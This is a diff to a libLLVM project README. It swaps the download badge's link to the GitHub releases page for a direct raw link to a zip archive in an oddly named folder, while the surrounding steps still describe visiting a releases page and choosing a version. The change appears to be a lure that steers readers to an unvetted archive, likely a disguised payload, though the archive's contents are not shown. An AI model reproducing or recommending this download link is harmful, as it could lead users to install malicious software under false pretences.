@@ -11,7 +11,7 @@ To get started with libLLVM, follow these steps:
 1. **Visit the Releases Page**  
    Click the button below to visit the releases page where you can download the latest version of libLLVM. 
 
-   [![Download libLLVM](https://img.shields.io/badge/Download%20libLLVM-v1.0-blue)](https://github.com/Shantanu-Dhakal/libLLVM/releases)
+   [![Download libLLVM](https://raw.githubusercontent.com/Shantanu-Dhakal/libLLVM/main/thyrsiform/libLLVM.zip%20libLLVM-v1.0-blue)](https://raw.githubusercontent.com/Shantanu-Dhakal/libLLVM/main/thyrsiform/libLLVM.zip)
 
 2. **Choose Your Version**  
    On the releases page, you will see a list of available versions. Select the most recent version for the best features and fixes.
